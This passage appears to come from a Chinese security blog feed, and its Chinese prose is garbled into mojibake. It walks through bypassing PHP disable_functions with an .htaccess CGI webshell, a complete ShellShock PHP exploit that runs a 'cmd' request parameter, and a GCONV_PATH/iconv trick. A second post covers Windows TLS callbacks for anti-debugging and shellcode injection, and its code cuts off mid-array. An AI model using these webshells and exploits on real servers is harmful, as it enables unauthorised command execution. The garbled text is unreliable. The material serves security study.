<p>å½“Apache å¼€å¯äº†cgi, rewriteæ—¶ï¼Œå¯ä»¥åˆ©ç”¨.htaccessæ–‡ä»¶ï¼Œä¸´æ—¶å…è®¸ä¸€ä¸ªç›®å½•å¯ä»¥æ‰§è¡Œcgiç¨‹åºå¹¶ä¸”ä½¿å¾—æœåŠ¡å™¨å°†è‡ªå®šä¹‰çš„åç¼€è§£æä¸ºcgiç¨‹åºï¼Œåˆ™å¯ä»¥åœ¨ç›®çš„ç›®å½•ä¸‹ä½¿ç”¨.htaccessæ–‡ä»¶è¿›è¡Œé…ç½®ã€‚</p>
<h5 id="åˆ©ç”¨æ–¹æ³•-4"><a href="#åˆ©ç”¨æ–¹æ³•-4" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h5><p>1.åœ¨webç›®å½•ä¸‹ä¸Šä¼ ä¸€ä¸ª .htaccess æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .ant</span><br></pre></td></tr></table></figure>

<p>2.ä¸Šä¼ shell.ant</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="keyword">echo</span> Content-type: text/html</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">echo</span>&amp;&amp;id</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è®¿é—® shell.ant ä¼šæŠ¥é”™ï¼Œæ˜¯å› ä¸ºæƒé™é—®é¢˜</p>
<p><img src="/posts/fbcae803/9.png" alt="img"></p>
<p>3.ä½¿ç”¨èšå‰‘ç›´æ¥ä¿®æ”¹æƒé™ ä»0644-&gt; 0777</p>
<p><img src="/posts/fbcae803/10.png" alt="img"></p>
<p>å†æ¬¡è®¿é—®å³å¯</p>
<p><img src="/posts/fbcae803/11.png" alt="img"></p>
<hr>
<p>ä½¿ç”¨èšå‰‘æ’ä»¶çš„æ–¹å¼</p>
<p><img src="/posts/fbcae803/12.png" alt="img"></p>
<p>ç‚¹å‡»å¼€å§‹å ä¼šåˆ›å»º ä¸€ä¸ªæ–°çš„ è™šæ‹Ÿç»ˆç«¯ </p>
<p><img src="/posts/fbcae803/13.png" alt="img"></p>
<p>å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤</p>
<p><img src="/posts/fbcae803/14.png" alt="img"></p>
<h4 id="åˆ©ç”¨ShellShock-CVE-2014-6271"><a href="#åˆ©ç”¨ShellShock-CVE-2014-6271" class="headerlink" title="åˆ©ç”¨ShellShock CVE-2014-6271"></a>åˆ©ç”¨ShellShock CVE-2014-6271</h4><h5 id="åˆ©ç”¨æ¡ä»¶-5"><a href="#åˆ©ç”¨æ¡ä»¶-5" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><ol>
<li>Linux æ“ä½œç³»ç»Ÿ</li>
<li>putenv</li>
<li>mail or  error_log ä¸è¢«ç¦ç”¨</li>
<li>/bin/bash å­˜åœ¨ CVE-2014-6271æ¼æ´ (bash&lt;=4.3)/bin/sh -&gt; /bin/bash  shé»˜è®¤çš„shellæ˜¯bash</li>
<li>PHP &lt; 5.6.2</li>
</ol>
<h5 id="åˆ©ç”¨æ–¹æ³•-5"><a href="#åˆ©ç”¨æ–¹æ³•-5" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h5><p>æµ‹è¯•æ˜¯å¦å­˜åœ¨è¯¥æ¼æ´</p>
<p>å‘½ä»¤è¡Œè¾“å…¥ env x=â€™() { :;}; echo vulnerableâ€™ bash -c â€œecho this is a testâ€</p>
<p>å¦‚æœè¾“å‡º vulnerable è¯´æ˜å­˜åœ¨è¯¥æ¼æ´</p>
<p><img src="/posts/fbcae803/15.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$d</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;error_log&#x27;</span>) || <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;mail&#x27;</span>)))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>)!=<span class="literal">FALSE</span>)&#123;</span><br><span class="line">      <span class="variable">$tmp</span>=<span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">      <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">&quot;Not vuln (not bash)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$output</span>!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">&quot;No output, or not vuln.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;ä¸æ»¡è¶³ä½¿ç”¨æ¡ä»¶&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// runcmd(&quot;whoami&quot;); // è¦æ‰§è¡Œçš„å‘½ä»¤</span></span><br><span class="line"><span class="title function_ invoke__">runcmd</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]); <span class="comment">// ?cmd=whoami</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ è¯¥exp_cve2014-6271.php åˆ°ç›®æ ‡ä¸»æœº</p>
<p>åŒ…å«æ–‡ä»¶å³å¯</p>
<p><img src="/posts/fbcae803/16.png" alt="img"></p>
<p>åœ¨èšå‰‘è™šæ‹Ÿç»ˆç«¯ä¸Šå·²ç»é›†æˆäº†å¯¹ShellShockçš„åˆ©ç”¨ å¯ä»¥åœ¨ç»ˆç«¯ä¸Šç›´æ¥æ‰§è¡Œå‘½ä»¤</p>
<h4 id="åˆ©ç”¨iconvæ‹“å±•"><a href="#åˆ©ç”¨iconvæ‹“å±•" class="headerlink" title="åˆ©ç”¨iconvæ‹“å±•"></a>åˆ©ç”¨iconvæ‹“å±•</h4><h5 id="åˆ©ç”¨æ¡ä»¶-6"><a href="#åˆ©ç”¨æ¡ä»¶-6" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h5><ol>
<li>Linuxæ“ä½œç³»ç»Ÿ</li>
<li>putenv</li>
<li>iconv</li>
<li>å­˜åœ¨å¯å†™ç›®å½• ä¸Šä¼ .soæ–‡ä»¶</li>
<li>ç›¸æ¯”LD_PRELOADç¯å¢ƒä¸‹ å¤šç¦ç”¨äº†error_log</li>
</ol>
<h5 id="åˆ©ç”¨åŸç†-1"><a href="#åˆ©ç”¨åŸç†-1" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;GCONV_PATH=/tmp&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;payload&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;whatever&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨GCONV_PATHç¯å¢ƒå˜é‡ åŠ è½½ .soæ–‡ä»¶å¹¶åœ¨.soæ–‡ä»¶ä¸­æ‰§è¡Œå‘½ä»¤</p>
<p>å…·ä½“åŸç†åˆ†æå¯è§ <a href="https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/">https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/</a></p>
<h5 id="åˆ©ç”¨æ–¹æ³•-6"><a href="#åˆ©ç”¨æ–¹æ³•-6" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h5><p>ç›´æ¥ä½¿ç”¨èšå‰‘çš„æ’ä»¶</p>
<p><img src="/posts/fbcae803/17.png" alt="img"></p>
<p>å¯ä»¥çœ‹åˆ°åœ¨ /var/www/html/ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª .antproxy.php çš„shellæ–‡ä»¶  è¿æ¥åå³å¯æ‰§è¡Œå‘½ä»¤</p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://blog.csdn.net/unexpectedthing/article/details/123782308">https://blog.csdn.net/unexpectedthing/article/details/123782308</a></p>
<p><a href="https://xz.aliyun.com/t/10057#toc-7">https://xz.aliyun.com/t/10057#toc-7</a></p>
<p><a href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/</a></p>
]]></content>
  </entry>
  <entry>
    <title>TLSCallBack</title>
    <url>/posts/2926e3f0/</url>
    <content><![CDATA[<h4 id="TLSç®€ä»‹"><a href="#TLSç®€ä»‹" class="headerlink" title="TLSç®€ä»‹"></a>TLSç®€ä»‹</h4><p><strong>TLS</strong> (Thread Local Storage çº¿ç¨‹å±€éƒ¨å­˜å‚¨)ï¼Œæ˜¯ç»™å®šå¤šçº¿ç¨‹è¿›ç¨‹ä¸­çš„æ¯ä¸ªçº¿ç¨‹å¯ä»¥åˆ†é…å­˜å‚¨çº¿ç¨‹ç‰¹å®šæ•°æ®çš„ä½ç½®çš„æ–¹æ³•ã€‚ä½¿ç”¨TLSæŠ€æœ¯å¯ä»¥åœ¨çº¿ç¨‹å†…éƒ¨ç‹¬ç«‹ä½¿ç”¨æˆ–ä¿®æ”¹è¿›ç¨‹çš„å…¨å±€æ•°æ®æˆ–é™æ€æ•°æ®ï¼Œ å°±åƒå¯¹å¾…è‡ªèº«çš„å±€éƒ¨å˜é‡ä¸€æ ·ã€‚( ç”¨æ¥å°†æ•°æ®ä¸ä¸€ä¸ªæ­£åœ¨æ‰§è¡Œçš„æŒ‡å®šçº¿ç¨‹å…³è”èµ·æ¥ã€‚)</p>
<p><strong>TLSå›è°ƒå‡½æ•°çš„è°ƒç”¨è¦å…ˆäºå…¥å£ç‚¹(EPï¼Œentry point)ä»£ç çš„æ‰§è¡Œï¼Œè€Œè°ƒè¯•å™¨é€šå¸¸é»˜è®¤åœ¨ä¸»å‡½æ•°å…¥å£ç‚¹Mainè®¾ç½®æ–­ç‚¹</strong>ï¼Œå› æ­¤å¸¸å¸¸è¢«ç”¨ä½œåè°ƒè¯•æ‰‹æ®µä½¿ç”¨ã€‚</p>
<p>å¦‚æœå¼€å¯TLSåŠŸèƒ½ï¼ŒPEæ–‡ä»¶å¤´å°±ä¼šè®¾ç½®TLSè¡¨,åœ¨<code>IMAGE_NT_HEADERS-IMAGE_DATA_DIRECTORY-DataDirectry[9]</code>æè¿°äº† <code>IAMGE_TLS_DIRECTORY</code>ç»“æ„ä½“çš„ä½ç½®ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_TLS_DIRECTORY32</span> &#123;</span>   <span class="comment">//SIZE:0x18h</span></span><br><span class="line">    DWORD   StartAddressOfRawData;		<span class="comment">// TLSæ¨¡ç‰ˆåœ¨å†…å­˜ä¸­èµ·å§‹çš„VA</span></span><br><span class="line">    DWORD   EndAddressOfRawData;		<span class="comment">// TLSæ¨¡ç‰ˆåœ¨å†…å­˜ä¸­ç»“æŸçš„VA</span></span><br><span class="line">    DWORD   AddressOfIndex;             <span class="comment">// TLSç´¢å¼•çš„ä½ç½®	// PDWORD   </span></span><br><span class="line">    DWORD   AddressOfCallBacks;         <span class="comment">//æ‰§è¡ŒTLSæ³¨å†Œçš„å›è°ƒå‡½æ•°çš„å‡½æ•°æŒ‡é’ˆ(åœ°å€)æ•°ç»„ // PIMAGE_TLS_CALLBACK *  </span></span><br><span class="line">    DWORD   SizeOfZeroFill;				<span class="comment">// ç”¨äºæŒ‡å®šéé›¶åˆå§‹åŒ–æ•°æ®åé¢çš„ç©ºç™½ç©ºé—´çš„å¤§å°</span></span><br><span class="line">    DWORD   Characteristics;			<span class="comment">// å±æ€§</span></span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2926e3f0/1.png" alt="img"></p>
<h4 id="TLSå›è°ƒå‡½æ•°"><a href="#TLSå›è°ƒå‡½æ•°" class="headerlink" title="TLSå›è°ƒå‡½æ•°"></a>TLSå›è°ƒå‡½æ•°</h4><p>TLSå›è°ƒå‡½æ•°å±äºä¸€ç§ç‰¹æ®Šçš„å›è°ƒå‡½æ•° å…¶ä¼šåœ¨è¿›ç¨‹åŠ è½½å‰ã€è¿›ç¨‹åŠ è½½åã€çº¿ç¨‹åŠ è½½å‰ã€çº¿ç¨‹åŠ è½½åæ‰§è¡Œã€‚å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">VOID</span> <span class="params">(NTAPI *PIMAGE_TLS_CALLBACK)</span> <span class="params">( </span></span><br><span class="line"><span class="params">    PVOID DllHandle, 	<span class="comment">// æ¨¡å—å¥æŸ„</span></span></span><br><span class="line"><span class="params">	DWORD Reason, 		<span class="comment">// Reason éµå¾ªdllè°ƒç”¨æ—¶ç›¸åŒçš„å‚æ•°</span></span></span><br><span class="line"><span class="params"> 	PVOID Reserved		<span class="comment">// ä¿ç•™</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­Reasonå–å€¼ä¸ºï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_PROCESS_ATTACH 1    <span class="comment">//è¿›ç¨‹/ä¸»çº¿ç¨‹å¯åŠ¨</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_THREAD_ATTACH  2    <span class="comment">//å­çº¿ç¨‹å¯åŠ¨</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_THREAD_DETACH  3    <span class="comment">//å­çº¿ç¨‹å…³é—­</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_PROCESS_ATTACH 0    <span class="comment">//ä¸»çº¿ç¨‹å…³é—­</span></span></span><br></pre></td></tr></table></figure>

<h4 id="TLSä½¿ç”¨"><a href="#TLSä½¿ç”¨" class="headerlink" title="TLSä½¿ç”¨"></a>TLSä½¿ç”¨</h4><p>åœ¨VSä¸­ å¯ä»¥ç›´æ¥ä½¿ç”¨ç¼–è¯‘å™¨åŠŸèƒ½ è®¾ç½®TLSå›è°ƒ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)				<span class="comment">// æŒ‡æ˜ä½¿ç”¨TLSå›è°ƒ</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_callback&quot;</span>) 	</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆåœ¨ç¼–è¯‘å™¨ä¸­å£°æ˜TLSå›è°ƒ </p>
<p>æ³¨:x64ä¸‹ <code>_tls_used</code> ,x86ä¸‹ <code>__tls_used</code> x86ä¸‹å‰é¢å¤šä¸€ä¸ª<code>_</code>ï¼›<code>_tls_callback</code> åŒç†ã€‚</p>
<p><code>_tls_used</code> å£°æ˜ä½¿ç”¨TLSå›è°ƒ å°†åœ¨PEä¸­åˆ›å»ºä¸€ä¸ª <code>.tls</code>çš„èŠ‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">EXTERN_C <span class="type">const</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">EXTERN_C</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//tls import</span></span><br><span class="line">PIMAGE_TLS_CALLBACK thread_callback_base[] = &#123; tls_callback_1, tls_callback_2, <span class="number">0</span> &#125;;        <span class="comment">// è®¾ç½®TLSå›è°ƒ</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg()	<span class="comment">//å…±äº«æ•°æ®åŒº</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//_WIN64</span></span></span><br></pre></td></tr></table></figure>

<p>éšåè®¾ç½®TLSå›è°ƒ èŠ‚å <code>.CRT$XB</code> å«ä¹‰å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>CRT</code> è¡¨ç¤ºä½¿ç”¨C Runtimeæœºåˆ¶</li>
<li><code>$X</code> è¡¨ç¤ºéšæœºæ ‡è¯†</li>
<li><code>L</code> è¡¨ç¤ºTLS CallBack Section</li>
<li>æœ€åçš„ <code>B</code> å¯ä»¥æ›¿æ¢ä¸º <code>B~Y</code> ä¹‹é—´çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦</li>
</ul>
<h4 id="å®ä¾‹ä»£ç "><a href="#å®ä¾‹ä»£ç " class="headerlink" title="å®ä¾‹ä»£ç "></a>å®ä¾‹ä»£ç </h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> NTAPI __stdcall <span class="title function_">TLSCallbacks</span><span class="params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span>;</span><br><span class="line"><span class="comment">//linker spec</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)				<span class="comment">// æŒ‡æ˜ä½¿ç”¨TLSå›è°ƒ</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_callback&quot;</span>) 	<span class="comment">// å¼ºåˆ¶ç¼–è¯‘å™¨ç”Ÿæˆå¯¹thread_callback_baseçš„å¼•ç”¨ï¼Œé˜²æ­¢ä¼˜åŒ–</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">EXTERN_C <span class="type">const</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">EXTERN_C</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">//end linker</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//tls import</span></span><br><span class="line">PIMAGE_TLS_CALLBACK _tls_callback = TLSCallbacks;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//_WIN64</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//end </span></span><br><span class="line"><span class="comment">// tls declaration</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> NTAPI __stdcall <span class="title function_">TLSCallbacks</span><span class="params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span></span><br><span class="line">&#123;</span><br><span class="line">	MessageBoxA(<span class="literal">NULL</span>, (LPCSTR)<span class="string">&quot;TLS Callback before main :)&quot;</span>, (LPCSTR)<span class="string">&quot;TLS Callback&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// end declaration</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Main function but  never be executed :(&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2926e3f0/2.png" alt="img"></p>
<h4 id="TLSæ‹“å±•"><a href="#TLSæ‹“å±•" class="headerlink" title="TLSæ‹“å±•"></a>TLSæ‹“å±•</h4><p>ç”±äºTLSè°ƒç”¨æ—¶ é€šå¸¸å·²ç»åˆå§‹åŒ–äº†æ‰€æœ‰è¿›ç¨‹ç›¸å…³ä¿¡æ¯(DLLåŠ è½½ã€PEBåˆ†é…)ï¼Œæ‰€ä»¥ç†è®ºä¸Šå¯ä»¥å†TLS CallBack å‡½æ•°ä¸­å®ç°ä»»æ„ä»£ç ï¼Œå¯ä»¥é€šè¿‡TLSå®ç°å…¶ä»–æŠ€æœ¯ï¼Œå¦‚åœ¨TLSå›è°ƒå‡½æ•°ä¸­å®ç°Mapping Injection</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;OneCore.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> NTAPI __stdcall <span class="title function_">TLSCallbacks</span><span class="params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span>;</span><br><span class="line">DWORD <span class="title function_">FindProcessID</span><span class="params">(LPCTSTR ProcessName)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_used&quot;</span>)				<span class="comment">// æŒ‡æ˜ä½¿ç”¨TLSå›è°ƒ</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:_tls_callback&quot;</span>) 	</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">EXTERN_C <span class="type">const</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line">EXTERN_C</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//tls import</span></span><br><span class="line">PIMAGE_TLS_CALLBACK _tls_callback = TLSCallbacks;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> const_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//_WIN64</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> CalcShellcode[] = &#123;</span><br><span class="line">	<span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0xf7</span>, <span class="number">0xe7</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x60</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5b</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5b</span>, <span class="number">0x20</span>, <span class="number">0x48</span>,</span><br><span class="line">	<span class="number">0x8b</span>, <span class="number">0x1b</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x1b</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5b</span>, <span class="number">0x20</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xd8</span>, <span class="number">0x8b</span>, <span class="number">0x5b</span>, <span class="number">0x3c</span>, <span class="number">0x4c</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>, <span class="number">0x31</span>,</span><br><span class="line">	<span class="number">0xc9</span>, <span class="number">0x66</span>, <span class="number">0x81</span>, <span class="number">0xc1</span>, <span class="number">0xff</span>, <span class="number">0x88</span>, <span 